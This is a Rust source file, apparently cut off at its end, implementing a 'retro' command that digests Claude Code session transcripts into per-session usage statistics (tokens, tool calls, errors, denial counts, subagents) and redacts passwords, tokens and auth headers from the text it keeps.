//! retro: digest, push, pull, aggregate and admit.

use std::collections::hash_map::RandomState;
use std::collections::{BTreeSet, HashMap};
use std::fs::{self, File};
use std::hash::{BuildHasher, Hasher};
use std::io::{self, BufRead, BufReader, Read};
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use serde_json::{json, Map, Value};

use crate::cli::Call;
use crate::commands::intake::{
    backlog_add, backlog_context_error, check_suggestions, created_since, fingerprint,
    BACKLOG_SUFFIX, MAX_OPEN_PER_PROJECT, MAX_PER_DAY, RETRO_MARK, SUGGESTION_SCHEMA,
};
use crate::shared::board::{dump_board, load_board};
use crate::shared::conf::{fm_get, frontmatter, read_env_ordered};
use crate::shared::consts::{
    tag_lookalike, IDEA, NOTE_INVISIBLE, NOTE_LINK, NOTE_PHRASES, NOTE_SECRETS, NOTE_TAG,
    PIPELINE_STAGES, RETRO_STAGES, SLUG,
};
use crate::shared::exit::{exit, fail, Res};
use crate::shared::fs::{is_link, read_text, write_atomic};
use crate::shared::home::factory_home;
use crate::shared::http::{access_message, api, cas, Response};
use crate::shared::proc::hostname;
use crate::shared::py::{is_space, os_error, printable_line, repr, round_int, splitlines, strip};
use crate::shared::pyjson::{dumps, loads, DEFAULT, INDENT2};
use crate::shared::pyre::{Captures, Flags, Pattern};
use crate::shared::pyval::{py_repr, py_str, truthy};
use crate::shared::time::{format_stamp, now, parse_stamp, unix_now};
use crate::shared::unicode::nfkc;

macro_rules! secret_words {
    () => {
        "token|secret|password|passwd|api[_-]?key|credential|mysql_pwd|sshpass|rediscli_auth"
    };
}

const RETRO_DENIALS: &[&str] = &[
    "denied by the Claude Code auto mode classifier",
    "Permission to use",
    "doesn't want to proceed",
    "Blocked:",
];
const RETRO_ENV_NOISE: &[(&str, &str)] = &[
    ("winsize_crash", "undefined method `winsize'"),
    ("command_not_found", "command not found: "),
    ("zsh_no_matches", "no matches found: "),
    ("node_crash", "Node.js v"),
];
static RETRO_POLLS: [(&str, Pattern); 3] = [
    (
        "until_file",
        Pattern::new(r"\buntil \[ -[fs] ", Flags::NONE),
    ),
    (
        "task_output",
        Pattern::new(r"/tasks/[\w-]+\.output\b", Flags::NONE),
    ),
    (
        "quiet_window",
        Pattern::new(r"stat -c %Y|stat -f %m", Flags::NONE),
    ),
];
static RETRO_JOB: Pattern = Pattern::new(r"factory-(\d{2,5})-", Flags::NONE);
static RED_FLAG_TITLE: Pattern = Pattern::new(r"Red flag: (\S+) via (\S+)", Flags::NONE);
static BACKLOG_ITEM: Pattern = Pattern::new(r"- \[([ x])\] ([\w-]+): \S", Flags::NONE);
const RETRO_PUSH_FILE: &str = "retro-push.json";
static RETRO_PATH: Pattern = Pattern::new(r#"(?:~|\.{1,2})?/[^\s:'"()]+"#, Flags::NONE);
static RETRO_ASSIGN: Pattern = Pattern::new(
    r#"^\s*(?:[A-Za-z_]\w*=(?:'[^']*'|"[^"]*"|\S*)\s+)+"#,
    Flags::NONE,
);
static RETRO_HEADERS: Pattern = Pattern::new(
    concat!(
        r"(?i)\b((?:proxy-)?authorization|(?:set-)?cookie|x-api-key|cf-access-client-(?:id|secret))",
        r#"(\\?["']?\s*[:=]\s*\\?["']?)(?:\\[^\r\n'"]|[^\r\n'"\\])+"#
    ),
    Flags::NONE,
);
static RETRO_URL_CREDS: Pattern = Pattern::new(r"(?i)(?<=[a-z0-9+.-])://[^/\s]+@", Flags::NONE);
static RETRO_BEARER: Pattern = Pattern::new(r"(?i)\b(bearer\s+)[A-Za-z0-9._~+/=-]+", Flags::NONE);
static RETRO_USER_PASS: Pattern = Pattern::new(
    r"((?:^|\s)(?:-u|--user)(?:\s+|=)?)(?!=?\d+:\d+(?!\S))[^\s:]*:\S+",
    Flags::NONE,
);
static RETRO_MYSQL: Pattern = Pattern::new(
    r"(?<![\w.-])(?:mysql\w*|mariadb(?:-\w+)?)(?:\.exe)?(?![\w.-])",
    Flags::NONE,
);
static RETRO_MYSQL_PASS: Pattern =
    Pattern::new(r#"((?:^|\s)-p)("[^"]*"|'[^']*'|[^\s"']\S*)"#, Flags::NONE);
static RETRO_SSHPASS: Pattern =
    Pattern::new(r"(?<![\w.-])sshpass(?:\.exe)?(?![\w.-])", Flags::NONE);
static RETRO_SSHPASS_PASS: Pattern = Pattern::new(
    r#"((?:^|\s)-p\s*)("[^"]*"|'[^']*'|[^\s"']\S*)"#,
    Flags::NONE,
);
static RETRO_REDIS: Pattern =
    Pattern::new(r"(?<![\w.-])redis-cli(?:\.exe)?(?![\w.-])", Flags::NONE);
static RETRO_REDIS_PASS: Pattern = Pattern::new(
    r#"((?:^|\s)(?:-a\s*|--pass\s+))("[^"]*"|'[^']*'|[^\s"']\S*)"#,
    Flags::NONE,
);
static RETRO_DOCKER_LOGIN: Pattern = Pattern::new(
    r"(?<![\w.-])docker(?:\.exe)?\s+login(?![\w.-])",
    Flags::NONE,
);
static RETRO_OPENSSL: Pattern =
    Pattern::new(r"(?<![\w.-])openssl(?:\.exe)?(?![\w.-])", Flags::NONE);
static RETRO_OPENSSL_PASS: Pattern = Pattern::new(
    r#"((?:^|\s)-pass(?:in|out)?\s+pass:)("[^"]*"|'[^']*'|[^\s"']\S*)"#,
    Flags::NONE,
);
static RETRO_OPENSSL_K: Pattern = Pattern::new(
    r#"((?:^|\s)-[kK]\s+)("[^"]*"|'[^']*'|[^\s"']\S*)"#,
    Flags::NONE,
);
static RETRO_OPENSSL_BARE: Pattern = Pattern::new(
    r#"((?:^|\s)-pass(?:in|out)?\s+)(?!(?:pass|env|file|fd):|stdin(?!\S))("[^"]*"|'[^']*'|[^\s"']\S*)"#,
    Flags::NONE,
);
static RETRO_COMMAND_SPLIT: Pattern =
    Pattern::new(r#"(?:"[^"]*"|'[^']*'|[^|;&"']|["'])+|[|;&]+"#, Flags::NONE);
static RETRO_PASSWORD_STDIN: Pattern =
    Pattern::new(r"(?<![\w-])--password-stdin(?![\w-])", Flags::NONE);
static RETRO_ECHO_PASS: Pattern = Pattern::new(
    r#"((?:^|[\s;&(])echo\s+(?:-[neE]{1,3}\s+)?)("[^"]*"|'[^']*'|[^\s"'|;&]+)(\s*\|\s*)$"#,
    Flags::NONE,
);
static RETRO_SECRET_WORD: Pattern =
    Pattern::new(concat!("(?i)(?:", secret_words!(), ")"), Flags::NONE);
static RETRO_COUNT: Pattern = Pattern::new(r"\d{1,7}[,;)}\]]*", Flags::NONE);
static RETRO_KEYVALUE: Pattern = Pattern::new(
    concat!(
        r"(?i)(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{0,64}?(?:",
        secret_words!(),
        r")[A-Za-z0-9_-]{0,64})(\\?[",
        "\"'",
        r"]?\s*[=:]\s*)(",
        "\"[^\"]*\"|'[^']*'|\\S+)"
    ),
    Flags::NONE,
);
static RETRO_FLAG: Pattern = Pattern::new(
    concat!(
        r"(?i)(?<![A-Za-z0-9_-])(--[A-Za-z0-9_-]{0,64}?(?:",
        secret_words!(),
        r")[A-Za-z0-9_-]{0,64})(\s+)(?!-)(\S+)"
    ),
    Flags::NONE,
);
static RETRO_LONG_KEYVALUE: Pattern = Pattern::new(
    r#"(?<![A-Za-z0-9_-])([A-Za-z0-9_-]{65,})(\\?["']?\s*[=:]\s*)("[^"]*"|'[^']*'|\S+)"#,
    Flags::NONE,
);
static RETRO_LONG_FLAG: Pattern = Pattern::new(
    r"(?<![A-Za-z0-9_-])(--[A-Za-z0-9_-]{65,})(\s+)(?!-)(\S+)",
    Flags::NONE,
);
static RETRO_HOME: Pattern =
    Pattern::new(r"^(?:[A-Za-z]-)?-(?:home|Users)-[A-Za-z0-9_]+", Flags::NONE);
const RETRO_WRITE_ONLY: &str = "retro digests are written only by the host's bound service token";
const RETRO_REPLY_SCHEMA: &str = "factory.retro/1";
const RETRO_CATEGORIES: &[&str] = &[
    "navigation",
    "automated-checks",
    "reviewer-rules",
    "steering",
    "tool-economy",
    "information-access",
    "permissions",
];
static RETRO_SESSION_REF: Pattern = Pattern::new(
    r"[A-Za-z0-9][A-Za-z0-9._-]{0,63}/[0-9a-f-]{8,36}",
    Flags::ASCII,
);
static RETRO_SESSION: Pattern = Pattern::new(r"[0-9a-f-]{8,36}", Flags::ASCII);
static RETRO_FLAG_NAME: Pattern = Pattern::new(r"[A-Za-z0-9_.:-]{1,40}", Flags::ASCII);
const MAX_RETRO_BYTES: u64 = 131072;
const RETRO_EDIT_SCHEMA: &str = "factory.retro-edit/1";
const RETRO_RUN_SCHEMA: &str = "factory.retro-run/1";
const RETRO_DOC_EDIT_SCHEMA: &str = "factory.retro-doc-edit/1";
const RETRO_EDIT_CHANGE: usize = 600;
const MAX_RETRO_EDITS: usize = 2;
const RETRO_MERGED_MAX: usize = 100;
const RETRO_LESSONS_MAX: usize = 20;
const RETRO_EDITS_PER_DAY: usize = 2;
const RETRO_EDIT_SCOPE: &str = "retro edits only allowlisted project scopes; global is person-only";
const RETRO_DOC_EDIT_SCOPE: &str = "retro edits only allowlisted projects";
const RETRO_TOKENS: &[(&str, &str)] = &[
    ("cache_read", "cache_read_input_tokens"),
    ("cache_write", "cache_creation_input_tokens"),
    ("uncached_input", "input_tokens"),
    ("output", "output_tokens"),
];

static HOST_NAME: Pattern = Pattern::new(r"[A-Za-z0-9][A-Za-z0-9._-]{0,63}", Flags::ASCII);
static RUN_TAG: Pattern = Pattern::new(r"[A-Za-z0-9_-]{1,64}", Flags::ASCII);
static SIGNATURE: Pattern = Pattern::new(
    r"(?:[-*] )?Signature: ([A-Za-z0-9._/-]{1,200}#[a-z0-9]+(?:-[a-z0-9]+){1,5})",
    Flags::NONE,
);
static DISPUTE_ROW: Pattern = Pattern::new(
    r"\|\s*([1-9][0-9]*)\s*\|\s*(security|ux|ui|code)\s*\|\s*`?([A-Za-z0-9._/-]{1,200}#[a-z0-9]+(?:-[a-z0-9]+){1,5})`?\s*\|",
    Flags::NONE,
);
static REPEATED_SIGNATURE: Pattern = Pattern::new(
    r"[A-Za-z0-9._/-]{1,200}#[a-z0-9]+(?:-[a-z0-9]+){1,5}",
    Flags::NONE,
);
const REVIEWERS: &[&str] = &["security", "ux", "ui", "code"];
const TRACER_REVIEWERS: &[&str] = &["security", "ux", "ui", "code"];
const DOCUMENT_NAMES: &[&str] = &["notes.md", "decisions.md", "runbook.md"];
const MAX_EXPLORER_PROJECTS: usize = 1;
const TRIAL_PAUSE_REVERTS: usize = 2;
const MAX_PER_RUN: usize = 5;
const ENV_SECRET_MIN: usize = 12;
static DIGITS: Pattern = Pattern::new(r"\d+", Flags::NONE);
static ROUND_DIR: Pattern = Pattern::new(r"\bround-(\d+)/", Flags::NONE);
const USAGE: &str = "usage: factory.py retro digest [--days N] | push | pull YYYY-MM-DD | aggregate [--days N] | admit <run>, N from 1 to 90 for digest and 1 to 30 for aggregate";

pub fn retro_cmd(call: &Call) -> Res<()> {
    let (action, args) = (call.args[0].as_str(), &call.args[1..]);
    if action == "push" && args.is_empty() {
        return retro_push();
    }
    if action == "pull" && args.len() == 1 && is_date(&args[0]) {
        return pull(&args[0]);
    }
    if action == "admit" && args.len() == 1 && RUN_TAG.is_full(&args[0]) {
        return admit(&factory_home()?, &args[0]);
    }
    let most = match action {
        "digest" => 90,
        "aggregate" => 30,
        _ => 0,
    };
    let days = match args {
        [] if action == "aggregate" => "7",
        [] => "1",
        [flag, n] if flag == "--days" => n.as_str(),
        _ => "",
    };
    let n = if days.bytes().all(|b| b.is_ascii_digit()) {
        days.parse::<u64>().ok()
    } else {
        None
    };
    let Some(n) = n.filter(|n| (1..=most).contains(n)) else {
        return Err(fail(USAGE, 2));
    };
    if action == "digest" {
        digest(n as i64)
    } else {
        aggregate(n as i64)
    }
}

fn group<'t>(c: &Captures<'t>, i: usize) -> &'t str {
    c.get(i).map_or("", |m| m.as_str())
}

/// The first n characters of s.
fn cut(s: &str, n: usize) -> String {
    s.chars().take(n).collect()
}

/// `p.sub(r"\1[redacted]", text, count=count)`; a count of 0 replaces every match.
fn redact_after_group(p: &Pattern, text: &str, count: usize) -> String {
    let mut seen = 0;
    p.replace_all(text, |c| {
        seen += 1;
        if count == 0 || seen <= count {
            format!("{}[redacted]", group(c, 1))
        } else {
            c.get(0).unwrap().as_str().to_string()
        }
    })
}

/// Whether every secret word in name is token followed by s, as in max_tokens.
fn count_name(name: &str) -> bool {
    RETRO_SECRET_WORD.find_iter(name).all(|m| {
        m.as_str().to_lowercase() == "token"
            && matches!(name[m.end()..].chars().next(), Some('s' | 'S'))
    })
}

fn secret_pair(c: &Captures) -> String {
    let (name, sep, value) = (group(c, 1), group(c, 2), group(c, 3));
    if RETRO_SECRET_WORD.search(name).is_none() || (RETRO_COUNT.is_full(value) && count_name(name))
    {
        return c.get(0).unwrap().as_str().to_string();
    }
    format!("{name}{sep}[redacted]")
}

/// One command with every -k, -K and bare -pass, -passin or -passout value after its openssl as [redacted].
fn openssl_part(part: &str) -> String {
    let Some(end) = RETRO_OPENSSL.search(part).map(|c| c.get(0).unwrap().end()) else {
        return part.to_string();
    };
    let rest = redact_after_group(
        &RETRO_OPENSSL_BARE,
        &redact_after_group(&RETRO_OPENSSL_K, &part[end..], 0),
        0,
    );
    format!("{}{rest}", &part[..end])
}

/// line with the password after a mysql glued -p, after the first sshpass -p, redis-cli -a or --pass and
/// docker login -p, after every openssl -pass, -passin or -passout pass:, after every openssl -k, -K or bare
/// -pass, -passin or -passout in that command, and in an echo piped to docker login --password-stdin, as
/// [redacted].
fn tool_pass(line: &str) -> String {
    let mut line = line.to_string();
    for (tool, flag, count) in [
        (&RETRO_MYSQL, &RETRO_MYSQL_PASS, 0),
        (&RETRO_SSHPASS, &RETRO_SSHPASS_PASS, 1),
        (&RETRO_REDIS, &RETRO_REDIS_PASS, 1),
        (&RETRO_DOCKER_LOGIN, &RETRO_SSHPASS_PASS, 1),
        (&RETRO_OPENSSL, &RETRO_OPENSSL_PASS, 0),
    ] {
        if let Some(end) = tool.search(&line).map(|c| c.get(0).unwrap().end()) {
            line = format!(
                "{}{}",
                &line[..end],
                redact_after_group(flag, &line[end..], count)
            );
        }
    }
    let mut line: String = RETRO_COMMAND_SPLIT
        .find_iter(&line)
        .map(|m| openssl_part(m.as_str()))
        .collect();
    if let Some(hit) = RETRO_DOCKER_LOGIN
        .search(&line)
        .map(|c| c.get(0).unwrap().range())
    {
        // The login's own last letter sits before hit.end, so searching from there sees no new left edge.
        if RETRO_PASSWORD_STDIN.search(&line[hit.end..]).is_some() {
            let head = RETRO_ECHO_PASS.replace_all(&line[..hit.start], |c| {
                format!("{}[redacted]{}", group(c, 1), group(c, 3))
            });
            line = head + &line[hit.start..];
        }
    }
    line
}

pub(crate) fn retro_redact(text: &str) -> String {
    let text = RETRO_HEADERS.replace_all(text, |c| {
        format!("{}{}[redacted]", group(c, 1), group(c, 2))
    });
    let text = RETRO_URL_CREDS.replace_all(&text, |_| "://[redacted]@".into());
    let text = redact_after_group(&RETRO_BEARER, &text, 0);
    let text = redact_after_group(&RETRO_USER_PASS, &text, 0);
    let mut text = text
        .split('\n')
        .map(tool_pass)
        .collect::<Vec<_>>()
        .join("\n");
    for p in [
        &RETRO_KEYVALUE,
        &RETRO_FLAG,
        &RETRO_LONG_KEYVALUE,
        &RETRO_LONG_FLAG,
    ] {
        text = p.replace_all(&text, secret_pair);
    }
    for p in &NOTE_SECRETS {
        text = p.replace_all(&text, |_| "[redacted]".into());
    }
    text
}

/// name with its home prefix as ~. A slug turns every non-alphanumeric into -, so this host's
/// home slug finds where a hyphenated user name ends; any other home loses its first segment.
fn project_slug(name: &str, home: &str) -> String {
    let home: String = home
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '-' })
        .collect();
    if name == home || name.starts_with(&format!("{home}-")) {
        return format!("~{}", &name[home.len()..]);
    }
    RETRO_HOME.replace_all(name, |_| "~".into())
}

/// v with every string, and every object key, cut to 160 characters.
fn clip(v: Value) -> Value {
    match v {
        Value::Object(map) => Value::Object(
            map.into_iter()
                .map(|(k, v)| (cut(&k, 160), clip(v)))
                .collect(),
        ),
        Value::Array(items) => Value::Array(items.into_iter().map(clip).collect()),
        Value::String(s) => Value::String(cut(&s, 160)),
        v => v,
    }
}

fn pattern(text: &str) -> String {
    let joined = retro_redact(text)
        .split(is_space)
        .filter(|w| !w.is_empty())
        .collect::<Vec<_>>()
        .join(" ");
    let pathed = RETRO_PATH.replace_all(&joined, |_| "<path>".into());
    cut(&DIGITS.replace_all(&pathed, |_| "N".into()), 160)
}

fn command_key(cmd: &str) -> String {
    pattern(&RETRO_ASSIGN.replace_all(cmd, |_| String::new()))
}

/// A message or tool_result content as text: a string, or its joined text blocks.
fn text_of(content: Option<&Value>) -> String {
    match content {
        Some(Value::String(s)) => s.clone(),
        Some(Value::Array(blocks)) => blocks
            .iter()
            .filter_map(|b| b.as_object()?.get("text")?.as_str())
            .collect::<Vec<_>>()
            .join(" "),
        _ => String::new(),
    }
}

fn count(counts: &mut Map<String, Value>, key: String) {
    let n = counts.get(&key).and_then(Value::as_i64).unwrap_or(0);
    counts.insert(key, json!(n + 1));
}

/// counts in descending count order, ties in their first-seen order.
fn ranked(counts: Map<String, Value>) -> Map<String, Value> {
    let mut items: Vec<(String, Value)> = counts.into_iter().collect();
    items.sort_by_key(|(_, n)| std::cmp::Reverse(n.as_i64().unwrap_or(0)));
    items.into_iter().collect()
}

/// A usage field as Python's `isinstance(value, int)` reads it: bools count as 0 and 1.
fn usage_int(v: Option<&Value>) -> Option<i64> {
    match v? {
        Value::Bool(b) => Some(i64::from(*b)),
        v if is_int(v) => v.as_i64(),
        _ => None,
    }
}

/// The lines of a transcript as Python's text mode reads them: invalid UTF-8 replaced, and
/// `\r\n` and a lone `\r` ending a line like `\n`.
fn transcript_lines(path: &Path, mut each: impl FnMut(&str)) -> io::Result<()> {
    for chunk in BufReader::new(File::open(path)?).split(b'\n') {
        let chunk = chunk?;
        let text = String::from_utf8_lossy(&chunk);
        let text = text.strip_suffix('\r').unwrap_or(&text);
        text.split('\r').for_each(&mut each);
    }
    Ok(())
}

/// One transcript reduced to digest fields. main=false also counts isSidechain lines.
fn scan(path: &Path, main: bool) -> io::Result<Value> {
    let (mut usage, mut usage_at) = (Vec::<[i64; 4]>::new(), HashMap::<String, usize>::new());
    let (mut tools, mut cmds, mut attachments) = (Map::new(), Map::new(), Map::new());
    let mut models = BTreeSet::new();
    let mut calls: HashMap<String, (String, Value)> = HashMap::new();
    let mut results: Vec<(String, Value, String, bool)> = Vec::new();
    let (mut start, mut end): (Option<String>, Option<String>) = (None, None);
    let (mut human, mut interrupts, mut seen_assistant) = (0i64, 0i64, false);
    let mut round_max: Option<String> = None;
    let (mut prompt_count, mut prompt_chars) = (0i64, 0i64);
    let mut polls = [0i64; 3];
    let empty = Map::new();
    transcript_lines(path, |line| {
        let Ok(Value::Object(e)) = loads_lenient(line) else {
            return;
        };
        if main && truthy(e.get("isSidechain")) {
            return;
        }
        if let Some(Value::String(stamp)) = e.get("timestamp") {
            start.get_or_insert_with(|| stamp.clone());
            end = Some(stamp.clone());
        }
        let msg = e
            .get("message")
            .and_then(Value::as_object)
            .unwrap_or(&empty);
        let content = msg.get("content");
        let blocks: Vec<&Map<String, Value>> = match content {
            Some(Value::Array(items)) => items.iter().filter_map(Value::as_object).collect(),
            _ => Vec::new(),
        };
        let kind = e.get("type").and_then(Value::as_str);
        let attachment = e.get("attachment").and_then(Value::as_object);
        if kind == Some("attachment") && !seen_assistant && attachment.is_some() {
            let attachment = attachment.unwrap();
            let name = py_str(attachment.get("type").unwrap_or(&Value::Null));
            let size = dumps(&Value::Object(attachment.clone()), DEFAULT).len() as i64;
            let total = attachments.get(&name).and_then(Value::as_i64).unwrap_or(0);
            attachments.insert(name, json!(total + size));
        } else if kind == Some("assistant") {
            seen_assistant = true;
            if let Some(Value::String(model)) = msg.get("model") {
                models.insert(model.clone());
            }
            if let (Some(Value::String(id)), Some(Value::Object(used))) =
                (msg.get("id"), msg.get("usage"))
            {
                let at = *usage_at.entry(id.clone()).or_insert_with(|| {
                    usage.push([0; 4]);
                    usage.len() - 1
                });
                for (i, (_, field)) in RETRO_TOKENS.iter().enumerate() {
                    if let Some(n) = usage_int(used.get(*field)) {
                        usage[at][i] = usage[at][i].max(n);
                    }
                }
            }
            for b in &blocks {
                if b.get("type").and_then(Value::as_str) != Some("tool_use") {
                    continue;
                }
                let name = py_str(b.get("name").unwrap_or(&Value::Null));
                let inp = match b.get("input") {
                    Some(Value::Object(m)) => Value::Object(m.clone()),
                    _ => json!({}),
                };
                count(&mut tools, name.clone());
                calls.insert(
                    dumps(b.get("id").unwrap_or(&Value::Null), DEFAULT),
                    (name.clone(), inp.clone()),
                );
                for m in ROUND_DIR.find_iter(&dumps(&inp, DEFAULT)) {
                    let digits =
                        m.as_str()["round-".len()..m.as_str().len() - 1].trim_start_matches('0');
                    let digits = if digits.is_empty() { "0" } else { digits };
                    let higher = round_max
                        .as_deref()
                        .is_none_or(|max| (digits.len(), digits) > (max.len(), max));
                    if higher {
                        round_max = Some(digits.to_string());
                    }
                }
                if name == "Agent" || name == "Task" {
                    if let Some(Value::String(prompt)) = inp.get("prompt") {
                        prompt_count += 1;
                        prompt_chars += prompt.chars().count() as i64;
                    }
                }
                let target = match name.as_str() {
                    "Bash" => inp.get("command"),
                    "Read" => inp.get("file_path"),
                    _ => None,
                };
                if let Some(Value::String(target)) = target {
                    for (n, (_, p)) in RETRO_POLLS.iter().enumerate() {
                        polls[n] += i64::from(p.search(target).is_some());
                    }
                    if name == "Bash" {
                        count(&mut cmds, command_key(target));
                    }
                }
            }
        } else if kind == Some("user") {
            let text = text_of(content);
            interrupts += i64::from(text.contains("[Request interrupted"));
            let is_result = |b: &&Map<String, Value>| {
                b.get("type").and_then(Value::as_str) == Some("tool_result")
            };
            if blocks.iter().any(|b| is_result(&b)) {
                for b in blocks.iter().filter(|b| is_result(b)) {
                    let id = dumps(b.get("tool_use_id").unwrap_or(&Value::Null), DEFAULT);
                    let (name, inp) = calls.get(&id).cloned().unwrap_or(("?".into(), json!({})));
                    results.push((
                        name,
                        inp,
                        text_of(b.get("content")),
                        b.get("is_error") == Some(&Value::Bool(true)),
                    ));
                }
            } else if !truthy(e.get("isMeta"))
                && !truthy(e.get("isSidechain"))
                && !text.is_empty()
                && !text.starts_with('<')
            {
                human += 1;
            }
        }
    })?;
    let (mut errors, mut benign, mut error_patterns) = (0i64, 0i64, Map::new());
    let (mut denials, mut blocked_sleep, mut denial_patterns) = (0i64, 0i64, Map::new());
    let mut noise = [0i64; 4];
    for (i, (name, inp, text, is_error)) in results.iter().enumerate() {
        for (n, (_, needle)) in RETRO_ENV_NOISE.iter().enumerate() {
            noise[n] += i64::from(text.contains(needle));
        }
        if !is_error {
            continue;
        }
        let command = inp.get("command").and_then(Value::as_str).unwrap_or("");
        if text.contains("Blocked: sleep") {
            blocked_sleep += 1;
        } else if RETRO_DENIALS.iter().any(|phrase| text.contains(phrase)) {
            denials += 1;
            count(&mut denial_patterns, pattern(text));
        } else if i == results.len() - 1
            && ((name == "Bash" && command.contains("archive-workspace") && text.contains("137"))
                || (name.contains("archive_workspace")
                    && text.to_lowercase().contains("connection closed")))
        {
            benign += 1;
        } else {
            errors += 1;
            count(&mut error_patterns, pattern(text));
        }
    }
    let contexts: Vec<i64> = usage.iter().map(|u| u[2] + u[0] + u[1]).collect();
    let tokens: Map<String, Value> = RETRO_TOKENS
        .iter()
        .enumerate()
        .map(|(i, (key, _))| {
            (
                key.to_string(),
                json!(usage.iter().map(|u| u[i]).sum::<i64>()),
            )
        })
        .collect();
    let mean = if contexts.is_empty() {
        0
    } else {
        round_int(contexts.iter().sum::<i64>() as f64 / contexts.len() as f64)
    };
    let repeated: Map<String, Value> = ranked(cmds)
        .into_iter()
        .take(5)
        .filter(|(_, n)| n.as_i64().unwrap_or(0) >= 3)
        .collect();
    let round_max = match round_max {
        Some(digits) => Value::Number(digits.parse().unwrap()),
        None => Value::Null,
    };
    Ok(json!({
        "start": start, "end": end, "turns": usage.len(), "human_msgs": human, "interrupts": interrupts,
        "models": models.into_iter().collect::<Vec<_>>(), "tools": ranked(tools), "tokens": tokens,
        "context": {"first_turn": contexts.first().copied().unwrap_or(0), "mean_per_turn": mean},
        "first_turn_attachments": attachments,
        "agent_prompts": {"count": prompt_count, "chars": prompt_chars},
        "review_round_max": round_max,
        "polls": RETRO_POLLS.iter().zip(polls).map(|((k, _), n)| (k.to_string(), json!(n))).collect::<Map<_, _>>(),
        "env_noise": RETRO_ENV_NOISE.iter().zip(noise).map(|((k, _), n)| (k.to_string(), json!(n))).collect::<Map<_, _>>(),
        "errors": {"count": errors, "benign": benign, "patterns": ranked(error_patterns)},
        "denials": {"count": denials, "blocked_sleep": blocked_sleep, "patterns": ranked(denial_patterns)},
        "repeated_cmds": repeated,
    }))
}

/// config.md's device, else the hostname.
fn host(home: &Path) -> Res<String> {
    let config = home.join("config.md");
    if !config.is_file() {
        return Ok(hostname());
    }
    let meta = frontmatter(&config)
        .map_err(|e| fail(os_error(&e, Some(&config)), 1))?
        .0;
    Ok(match fm_get(&meta, "device") {
        Some(device) if !device.is_empty() => device.to_string(),
        _ => hostname(),
    })
}

pub(crate) fn retro_transcripts() -> PathBuf {
    let config = std::env::var_os("CLAUDE_CONFIG_DIR")
        .filter(|v| !v.is_empty())
        .map(PathBuf::from)
        .unwrap_or_else(|| std::env::home_dir().unwrap_or_default().join(".claude"));
    config.join("projects")
}

/// The entries of folder, sorted by name; with a suffix, only the names ending in it.
fn listed(folder: &Path, suffix: &str) -> Vec<PathBuf> {
    let mut paths: Vec<PathBuf> = fs::read_dir(folder)
        .into_iter()
        .flatten()
        .flatten()
        .map(|e| e.path())
        .filter(|p| {
            p.file_name()
                .is_some_and(|n| n.to_string_lossy().ends_with(suffix))
        })
        .collect();
    paths.sort();
    paths
}

fn mtime(path: &Path) -> io::Result<f64> {
    let modified = fs::metadata(path)?.modified()?;
    Ok(match modified.duration_since(UNIX_EPOCH) {
        Ok(d) => d.as_secs_f64(),
        Err(e) => -e.duration().as_secs_f64(),
    })
}

/// The clipped digest rows of every transcript under root changed since cutoff, oldest session first.
fn rows_in(root: &Path, host: &str, home: &str, cutoff: f64) -> Vec<Value> {
    let mut rows = Vec::new();
    for project in listed(root, "").into_iter().filter(|p| p.is_dir()) {
        let project_name = project.file_name().unwrap().to_string_lossy().into_owned();
        for path in listed(&project, ".jsonl") {
            if !mtime(&path).is_ok_and(|t| t >= cutoff) {
                continue;
            }
            let Ok(Value::Object(scanned)) = scan(&path, true) else {
                continue;
            };
            if scanned["start"].is_null() {
                continue;
            }
            let session = path.file_stem().unwrap().to_string_lossy().into_owned();
            let job = RETRO_JOB
                .search(&project_name)
                .map_or("ad-hoc".to_string(), |c| group(&c, 1).to_string());
            let mut row = Map::new();
            row.insert("host".into(), json!(host));
            row.insert("project".into(), json!(project_slug(&project_name, home)));
            row.insert("session".into(), json!(session));
            row.insert("job".into(), json!(job));
            row.extend(scanned);
            let (mut by_type, mut subagents) = (Map::new(), 0);
            for sub in listed(&project.join(&session).join("subagents"), ".jsonl") {
                let meta = fs::read_to_string(sub.with_extension("meta.json")).ok();
                let kind = match meta.and_then(|t| serde_json::from_str::<Value>(&t).ok()) {
                    Some(Value::Object(m)) if truthy(m.get("agentType")) => py_str(&m["agentType"]),
                    _ => "unknown".to_string(),
                };
                let Ok(d) = scan(&sub, false) else {
                    continue;
                };
                subagents += 1;
                let t = by_type.entry(kind).or_insert_with(|| {
                    json!({"count": 0, "turns": 0, "tokens": {"cache_read": 0, "cache_write": 0, "uncached_input": 0, "output": 0},
                           "errors": 0, "denials": 0, "models": [], "first_turns": []})
                });
                let add = |t: &mut Value, key: &str, n: &Value| {
                    t[key] = json!(t[key].as_i64().unwrap() + n.as_i64().unwrap())
                };
                add(t, "count", &json!(1));
                add(t, "turns", &d["turns"]);
                t["first_turns"]
                    .as_array_mut()
                    .unwrap()
                    .push(d["context"]["first_turn"].clone());
                add(t, "errors", &d["errors"]["count"]);
                add(t, "denials", &d["denials"]["count"]);
                let mut models: BTreeSet<String> = BTreeSet::new();
                for m in t["models"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .chain(d["models"].as_array().unwrap())
                {
                    models.insert(m.as_str().unwrap().to_string());
                }
                t["models"] = json!(models);
                for (key, _) in RETRO_TOKENS {
                    add(&mut t["tokens"], key, &d["tokens"][key]);
                }
                for (key, _) in RETRO_ENV_NOISE {
                    add(&mut row["env_noise"], key, &d["env_noise"][key]);
                }
            }
            row.insert(
                "subagents".into(),
                json!({"count": subagents, "by_type": by_type}),
            );
            rows.push(clip(Value::Object(row)));
        }
    }
    rows.sort_by(|a, b| {
        (a["start"].as_str(), a["session"].as_str())
            .cmp(&(b["start"].as_str(), b["session"].as_str()))
    });
    rows
}

/// This host's clipped digest rows from the last days, oldest session first.
fn rows(days: i64) -> Res<Vec<Value>> {
    let root = retro_transcripts();
    if !root.is_dir() {
        return Err(fail(
            format!("no Claude Code transcripts at {}", root.display()),
            4,
        ));
    }
    let host = host(&factory_home()?)?;
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs_f64();
    let home = home_text(std::env::home_dir())?;
    Ok(rows_in(&root, &host, &home, now - days as f64 * 86400.0))
}

/// `str(Path.home())`, which raises when there is no home directory.
fn home_text(home: Option<PathBuf>) -> Res<String> {
    home.map(|h| h.to_string_lossy().into_owned())
        .ok_or_else(|| fail("could not determine the home directory", 1))
}

fn digest(days: i64) -> Res<()> {
    for row in rows(days)? {
        println!("{}", dumps(&row, DEFAULT));
    }
    Ok(())
}

/// config.md's device, or "" when there is none.
